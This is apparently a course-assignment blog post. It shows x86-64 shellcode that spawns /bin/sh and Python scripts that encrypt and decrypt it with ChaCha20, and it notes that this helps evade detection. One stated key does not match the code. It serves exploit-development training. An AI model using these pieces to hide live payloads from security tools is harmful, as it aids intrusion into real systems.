# SLAE Assignment #7

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE64 - 1525

## Assignment

* Create a custom crypter like the one shown in the "crypters" video
* Free to use any existing encryption schema
* Can use any programming language


## Encryption Algorithm

For this task the Chacha20 algorithm has been picked up.
As input it's used the execve-stack.nasm shellcode.
Original shellcode that executes /bin/sh:

```
; Filename: execve-nasm.nasm
; Author:  SLAE64 - 1525
;
; Purpose: execute /bin/sh
BITS 64

global _start

section .text

; settings
SH equ 0x68732f6e69622f2f

; syscall kernel opcodes
SYS_EXECVE equ 0x3b

_start:
    xor rax, rax
    push rax
    pop rdx         
    push rdx
    mov rbx, SH ; build //bin/sh
    push rbx ; copy ¨//bin/sh¨ string to stack
    mov rdi, rsp ; get the address for /bin/sh string
    push rax ; build args array, by pushing NULL
    push rdi ; then pushing string address
    mov rsi, rsp ; args array address
	push SYS_EXECVE
    pop rax
    syscall
```

Converted to opcodes:

```
$ ./compile-execve-stack.sh execve-stack
######### NASM #########
[+] Assembling with Nasm ... 
[+] Done!
[+] Linking ...
[+] Done!
[+] Objdump ...
"\x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05"
```

The final shellcode to use it's the following (we don't add any encoder stub, since the task is focused on encryption, but adding it at this point would help to decrease the detection rate):

```
"\x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05"
```

## Algorithm Explanation

ChaCha20 is a stream cipher developed by Daniel J. Bernstein. Its original design expands a 256-bit key into 2^64 randomly accessible streams, each containing 2^64 randomly accessible 64-byte (512 bits) blocks

## Encrypter

Here follows the Chacha20 encrypter which takes as input the shellcode and the encryption key, it gives as output the encrypted shellcode:

```python
#!/usr/bin/python
# Python Chacha20 Crypter
# Author: ID: SLAE64 - 1525
#
# Usage: python Encrypt.py

from Crypto.Cipher import ChaCha20
import base64


def encrypt():
    shellcode = "\x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05" # Execve-stack shellcode
    secret = b'G-KaPdSgVkYp3s6v9y$B&E)H@MbQeThW'
    cipher = ChaCha20.new(key=secret)
    crypted_shellcode = cipher.nonce + cipher.encrypt(shellcode)
    return base64.b64encode(crypted_shellcode)


if __name__ == "__main__":
    print encrypt()
```

## Decrypter

Here follows the Chacha20 decrypter which takes as input the encryption key, it gives as output the original shellcode:

```python
#!/usr/bin/python
# Python Chacha20 Decrypter
# Author: ID: SLAE64 - 1525
#
# Usage: python Decrypt.py

from Crypto.Cipher import ChaCha20
import base64


def decrypt():
    encoded_shellcode = base64.b64decode("F4KWN/2CwTuRIBALnZxp1uLp6ZqnJaLPqjb6dZFC3H+jPmiUYiA=") # Encoded Execve-stack shellcode
    secret = b'G-KaPdSgVkYp3s6v9y$B&E)H@MbQeThW'
    msg_nonce = encoded_shellcode[:8]
    ciphertext = encoded_shellcode[8:]
    cipher = ChaCha20.new(key=secret, nonce=msg_nonce)
    return cipher.decrypt(ciphertext)


if __name__ == "__main__":
    shellcode = decrypt()
    encoded = ''
    for x in bytearray(shellcode):
        encoded += '\\x%02x' % x
    print encoded
```

## Proof of execution

Let's encrypt:

```
$ python Encrypt.py 
6NQgwIJKICXUtw9IOnBjfg7Qjn8RQE7yIGii+q8YPe2hIYlAc44=
```

Let's decrypt the shellcode with they key ABCDEFGHABCDEFGH:

```
$ python Decrypt.py 
\x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05
```

As visible we have back the original shellcode.